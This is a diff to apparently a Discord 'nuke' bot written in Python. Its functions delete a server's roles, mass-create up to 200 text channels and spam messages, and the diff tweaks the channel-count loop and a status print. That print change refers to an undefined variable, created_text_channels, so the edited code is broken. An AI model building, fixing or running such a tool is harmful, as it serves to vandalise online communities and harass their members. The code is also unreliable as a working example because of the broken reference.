@@ -81,7 +81,7 @@ async def send_messages_to_channels(guild, name):
     
 async def create_text_channels(guild, name):
     created = 0
-    for _ in range(200 - len(guild.channels)):
+    for _ in range(200 - len(guild.text_channels)):
         try:
             await guild.create_text_channel(name=name)
             created += 1
@@ -98,7 +98,7 @@ async def nuke_guild(guild):
     delete_roles = await delete_all_roles(guild)
     print(f'{m}Delete Roles:{b}{delete_roles}')
     created_channels = await create_text_channels(guild,name)
-    print(f'{m}Create Text Channels:{b}{created_channels}')
+    print(f'{m}Create Text Channels:{b}{created_text_channels}')
     #created_roles = await created_roles(guild,name)
     #print(f'{m}Create Roles:{b}{created_roles}')
     print(f'{r}--------------------------------------------\n\n')
